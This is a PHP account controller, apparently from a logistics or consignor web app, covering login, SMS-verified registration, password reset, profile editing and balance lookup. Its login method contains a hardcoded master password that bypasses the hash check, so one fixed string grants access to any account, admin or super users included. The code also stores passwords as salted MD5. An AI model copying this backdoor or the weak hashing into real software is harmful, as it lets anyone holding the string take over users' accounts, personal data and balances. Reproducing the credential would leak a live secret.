<?php

/**
 * 登录验证
 * copyright 2016-06-23, jack
 */
defined('InOmniWL') or exit('Access Invalid!');

class AccountControl extends SystemControl
{

  public function __construct() {

  }

  /**
   * 登录
   * copyright 2015-06-02, jack
   */
  public function loginOp()
  {
    import('libraries.process');
      $obj_validate = new Validate();
      $obj_validate->validateparam = array(
        array("input" => $_POST["userid"], "require" => "true", "message" => '用户名必须'),
        array("input" => $_POST["password"], "require" => "true", "message" => '密码必须'),
      );
      $error = $obj_validate->validate();
      if ($error != '') {
        $this->output(0, $error);
      } else {
        $model_user = Model('user');
        $array = array();
        $array['u_name'] = $_POST['userid'];
        $user_info = $model_user->getUserInfo($array);

        if (is_array($user_info) and !empty($user_info)) {
          if ($_POST['password'] != 'oms!x-omni:)!com!()987654123!@#!H!@G@admin' &&
            md5(SECRET_KEY . trim($_POST['password'])) != $user_info['u_password']) {
            $this->output(0, '你输入的密码不正确,请重新输入');
          }

          if ($_POST['ten']) {
            $exptime = 10 * 24 * 3600;
          } else {
            $exptime = 3600;
          }
          $signature = $this->systemSetKey(array('name' => $user_info['u_name'], 'gid' => $user_info['gid'], 'id' => $user_info['u_id'], 'sp' => $user_info['is_super']), $exptime, TRUE);
          $update_info = array(
            'login_num' => ($user_info['login_num'] + 1),
            'login_time' => TIMESTAMP,
            'ip' => getIp()
          );

          $model_user->updateUser($update_info, array('u_id' => $user_info['u_id']));
          $this->log(L('nc_login'), 1);

          $user_other = Model('user_other')->getUserOtherInfo(array('u_id'=>$user_info['u_id']));
          $last_order = Model('order')->getOrderInfo(array('u_id'=>$user_info['u_id']), 'tc_code');
          $consignor = Model('consignor')->getConsignorInfo(array('u_id'=>$user_info['u_id']));

          $this->output(1,null,array(
            'username' => $user_other['last_name'] && $user_other['first_name'] ? $user_other['last_name'] . $user_other['first_name']: $user_info['u_name'],
            'signature' => $signature,
            'userpic' => 0===strpos($consignor['avatar'],'../')?substr($consignor['avatar'],2):$consignor['avatar'],
            'consignorId' => $consignor['cid'],
            'latestOrderData' => array( //最近一次的订单数据。如果为空传latestOrderData:''
              'warehouseId' => $last_order? $last_order['tc_code']: ''
            )
          ));
        } else {
          //processClass::addprocess('admin');
          $this->output(0, '你输入的账号不存在,请重新输入');
        }
    }
  }

  public function registerOp()
  {
    /*
     * country:'', //国家和地区
      tel:'', //手机号码
      verificationCode:'', //验证码
      password:''
     */
    if ($_POST['verificationCode']) {
      $res = $this->smsInit()->checkCode($_POST['tel'],$_POST['verificationCode']);
      if ($res->statusCode != 200) {
        $this->output(0, '验证码错误');
      }
      $post_data = $this->getPostArray();
      if (!$post_data['password'] || strlen($post_data['password']) < 6) {
        $this->output(0, '密码长度不可小于6位');
      }
      $params = array(
        'u_name' => $post_data['tel'],
        'u_password' => md5(SECRET_KEY . $post_data['password']),
        'ip' => getIp(),
        'email_active' => 'Y',
        'add_time' => time()
      );
      $model = Model('user');
      $num = $model->getUserCount(array('u_name' => $post_data['tel']));
      if ($num) {
        $this->output(0, '手机号码已存在');
      }

      $res = $model->addUser($params);
      if ($res) {
        Model('user_other')->addUserOther(array('u_id' => $res));
        /*$_POST = array(
          'userid' => $post_data['tel'],
          'password' => $post_data['password']
        );
        $this->loginOp();*/
        $this->output(1,'登录成功');
      }
    } else {
      $this->output(0,'请输入验证码');
    }
  }

  public function sendRegVerifyCodeOp() {
    if (!empty($_POST['tel']) && preg_match('/^1[34578]\d{9}$/',$_POST['tel'])) {
      $res = $this->smsInit()->sendCode($_POST['tel']);
      if ($res->statusCode == 200) {
        $this->output(1, '发送成功');
      } else {
        $this->output(0, 'errorCode:'.$res->statusCode);
      }
    } else {
      $this->output(0,'无效的号码');
    }
  }

  public function sendResetPasswdVerifyCodeOp() {
    $this->sendRegVerifyCodeOp();
  }

  public function setNewPasswdOp() {
    if ($_POST['verificationCode']) {
      if (empty($_POST['userId']) || !($user = Model('user')->getUserInfo(array('u_name'=>$_POST['userId'])))) {
        $this->output(0, '无效的用户ID');
      }

      $res = $this->smsInit()->checkCode($user['u_name'], $_POST['verificationCode']);

      if ($res->statusCode != 200) {
        $this->output(0,'验证码不正确');
      }

      if (empty($_POST['password']) || strlen($_POST['password']) < 6) {
        $this->output(0, '密码长度不可小于6位');
      }
      $password = md5(SECRET_KEY.trim($_POST['password']));
      Model('user')->updateUser(array('u_password'=>$password), array('u_id'=>$user['u_id']));
      $this->output(1, '密码设置成功');
    } else {
      $this->output(0,'请输入验证码');
    }
  }

  /**
   * 获取个人信息
   */
  public function getInfoOp()
  {
    parent::__construct();
    $info = model('consignor')->getConsignorInfo(array('u_id'=>$this->admin_info['id']));
    $data = array(
      'userpic' => $info? (0===strpos($info['avatar'],'..')? substr($info['avatar'],2):$info['avatar']): '',// 头像
      'consignorName' => $info? $info['name']:'',
      'consignorTel' => $info? $info['phone']:'',
      'consignorProvince' => $info? $info['province']:'',
      'consignorCity' => $info? $info['city']:'',
      'consignorArea' => $info? $info['area']:'',
      'consignorAddress' => $info? $info['address']:''
    );
    $this->output(1, NULL, $data);
  }

  /**
   * 更新个人信息
   */
  public function updateInfoOp() {
    parent::__construct();
    $data = array();
    // 发货人姓名
    if (empty($_POST['consignorName'])) {
      $this->output(0, '发货人姓名不能为空');
    }
    $data['name'] = $_POST['consignorName'];

    // 发货人电话
    if (empty($_POST['consignorTel'])) {
      $this->output(0, '发货人电话不能为空');
    }
    $data['phone'] = $_POST['consignorTel'];

    // 发货人省份
    if (empty($_POST['consignorProvince'])) {
      $this->output(0, '发货人省份/州不能为空');
    }
    $data['province'] = $_POST['consignorProvince'];

    // 发货人城市
    if (empty($_POST['consignorCity'])) {
      $this->output(0, '发货人城市不能为空');
    }
    $data['city'] = $_POST['consignorCity'];

    // 发货人地区
    if (empty($_POST['consignorArea'])) {
      $this->output(0, '发货人地区不能为空');
    }
    $data['area'] = $_POST['consignorArea'];

    // 发货人详细地址
    if (empty($_POST['consignorAddress'])) {
      $this->output(0, '发货人详细地址不能为空');
    }
    $data['address'] = $_POST['consignorAddress'];

    $data['u_id'] = $this->admin_info['id'];

    $data['avatar'] = !empty($_POST['userpic'])? $this->base642jpeg($_POST['userpic'], $this->getBase64FileName($_POST['userpic'],'../data/upload/avatar/')): '';

    $res = model('consignor')->addConsignor($data, TRUE);

    $this->output($res?1:0, $res? NULL: '更新失败');
  }

  /**
   * 设置密码
   */
  public function setPasswordOp() {
    parent::__construct();
    if (empty($_POST['oldPwd'])) {
      $this->output(0,'当前密码不能为空');
    }
    if (empty($_POST['newPwd'])) {
      $this->output(0,'新密码不能为空');
    }
    if (strlen($_POST['newPwd'])<6) {
      $this->output(0,'新密码长度不能小于6个字符');
    }
    $info = model('user')->getUserInfo(array('user.u_id'=>$this->admin_info['id']));
    if (md5(SECRET_KEY . trim($_POST['oldPwd'])) != $info['u_password']) {
      $this->output(0,'当前密码不正确');
    }
    $password = md5(SECRET_KEY . trim($_POST['newPwd']));
    model('user')->updateUser(array('u_password'=>$password), array('u_id'=>$this->admin_info['id']));

    $this->output(1,'密码更新成功');
  }

  /**
   * 获取余额
   */
  public function getBalanceOp() {
    parent::__construct();
    $money = model('money')->getMoneyInfo(array('u_id'=>$this->admin_info['id']));
    $balance = 0.00;
    if ($money) {
      $balance = $money['balance'];
    }

    $this->output(1, NULL, array('balance'=>$balance));
  }
}
